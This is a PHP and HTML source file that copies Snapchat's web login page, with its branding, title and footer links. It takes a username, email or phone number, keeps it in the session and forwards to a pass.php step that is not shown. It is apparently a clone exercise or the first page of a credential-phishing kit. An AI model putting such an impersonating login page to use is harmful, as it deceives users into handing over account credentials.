<?php
    session_start();
    $uid= $empty_err= $uid_err="";
    if($_SERVER["REQUEST_METHOD"]=="POST")
    {
        if(empty($_POST["login_id"]))
        {
            $empty_err="This field cannot be empty.";
        }
        else
        {
            $_SESSION['login_id']=htmlspecialchars($_POST["login_id"]);
            $uid=htmlspecialchars($_POST["login_id"]);
            if(filter_var($uid,FILTER_VALIDATE_EMAIL) or (preg_match("/^[0-9]{10}+$/", $uid)))
            {
                header("Refresh:0; url=pass.php");
                exit();
            }
            else
            {
                $uid_err="Invalid Input.";
            }
        }
    }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Share the moment | Snapchat</title>
</head>
<body>
    <header>
        <div id="header_left">
            <a href="https://www.snapchat.com/"><img src="snapchat_icon.png" alt="Snapchat"></a>
        </div>

        <div id="header_center">
            <a href="https://www.snapchat.com/discover">
                <div class="center_logo">
                    <img src="stories_icon.png" alt="Stories">
                    <p>Stories</p>
                </div>
            </a>
            <a href="https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYaWtuZ2xya3pxAZDBVLz8AZDBVGi_AAAAAQ?web_client_id=c7d50cfe-2e13-4caf-9cee-78f3c6b16d9c">
                <div class="center_logo">
                    <img src="spotlight_icon.png" alt="Spotlight">
                    <p>Spotlight</p>
                </div>
            </a>
            <a href="https://web.snapchat.com/?ref=web_nav_chat_icon&web_client_id=c7d50cfe-2e13-4caf-9cee-78f3c6b16d9c">
                <div class="center_logo">
                    <img src="chat_icon.png" alt="Chat"><br> 
                    <p>Chat</p>
                </div>
            </a>
            <a href="https://www.snapchat.com/lens">
                <div class="center_logo">
                    <img src="lenses_icon.png" alt="Lenses"><br>
                    <p>Lenses</p>
                </div>
            </a>
        </div>

        <div id="header_right">
            <button onclick="location.href='https://forbusiness.snapchat.com/?utm_source=snapchat_com&utm_medium=referral&utm_campaign=internal_referral&utm_content=header_cta';">Snapchat Ads</button>
            <button onclick="location.href='https://www.snapchat.com/download?purpose=snapchatdotcom&sp=snapchatdotcom';">Download</button>
        </div>
    </header>

    <div class="container">

        <div class="container_left">
            <h3>Log in to Snapchat</h2>
            <p id="left_top_p">Chat, Snap, and video call your friends. Watch Stories and Spotlight, all from your computer.</h3>
            <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post"> 
                <label for="login_id">Username or email address or phone number</label>
                <input type="text" name="login_id"><br> 
                <div class="error"><?php echo $uid_err, $empty_err; ?></div>
                <button type="submit">Log in</button>
            </form>
            <p class="download_p">or continue with downloading Snapchat WebApp</p>
            <a href="https://apps.microsoft.com/detail/9pf9rtkmmq69?cid=snapchat_home_page_sidebar&hl=en-us&gl=IN"><img src="getFromMicrosoft.png" alt="Get from microsoft" id="download_img"></a>
            <p class="download_p">Looking for the app? Get it <a href="https://www.snapchat.com/download">here.</a></p>
        </div>

        <div class="container_right">
            <div class="container_right_top">
                <img src="lesssocialmediamoresnapchat.png" alt="Less social media more snapchat">
            </div>

            <div class="container_right_bottom">
                <div class="col">
                    <p>Company</p>
                    <a href="https://snap.com/en-US">Snap Inc.</a><br>
                    <a href="https://careers.snap.com/">Careers</a><br>
                    <a href="https://newsroom.snap.com/">News</a>
                </div>
                <div class="col">
                    <p>Community</p>
                    <a href="https://help.snapchat.com/hc/en-us?utm_campaign=ap&utm_medium=snap&utm_source=web">Support</a><br>
                    <a href="https://values.snap.com/privacy/transparency/community-guidelines">Community Guidelines</a><br>
                    <a href="https://values.snap.com/safety/safety-center">Safety Center</a>
                </div>
                <div class="col">
                    <p>Advertising</p>
                    <a href="https://forbusiness.snapchat.com/?utm_source=accounts_snapchat_com&utm_medium=referral&utm_campaign=internal_referral&utm_content=footer_link">Buy Ads</a><br>
                    <a href="https://snap.com/en-US/ad-policies"> Advertising Policies</a><br>
                    <a href="https://snap.com/en-US/political-ads">Political Ads Library</a><br>
                    <a href="https://snap.com/en-US/brand-guidelines">Brand Guidelines</a><br>
                    <a href="https://help.snapchat.com/hc/en-us/articles/7047502545044-Promotions-Rules?utm_campaign=ap&utm_medium=snap&utm_source=web">Promotions Rules</a>
                </div>
                <div class="col">
                    <p>Legal</p>
                    <a href="https://values.snap.com/privacy/privacy-center">Privacy Center</a><br>
                    <a href="https://help.snapchat.com/hc/en-us/articles/11399265637012-Your-Privacy-Choices-on-Snapchat?utm_campaign=privacy_choices&utm_medium=global_footer&utm_source=snapchat_com">Your Privacy Choices</a>
                    <a href="https://snap.com/en-US/cookie-policy">Cookie Policy</a><br>
                    <a href="https://help.snapchat.com/hc/en-us/articles/7012332110996-About-Reporting-Infringement-on-Snapchat?utm_campaign=ap&utm_medium=snap&utm_source=web">Report Infringement</a><br>
                    <a href="https://snap.com/en-US/terms/custom-creative-tools">Custom Creative Tools Terms</a><br>
                    <a href="https://www.snap.com/en-US/terms/create-geofilter">Community Geofilter Terms</a><br>
                    <a href="https://snap.com/en-US/terms/lens-studio-license-agreement">Lens Studio Terms</a>
                </div>
            </div>

            <div class="end">
                <a href="https://values.snap.com/privacy/privacy-policy">Privacy Policy</a>
                <a href="https://snap.com/en-US/terms">Terms of Service</a>
            </div>
        </div>

        <footer>
            <p>Are you a parent? Learn what we're doing to help keep <a href="https://parents.snapchat.com/?ref=web_snapchatters_safe_here_cta">Snapchatters safe.</a></p>
        </footer>
    </div>
</body>
</html>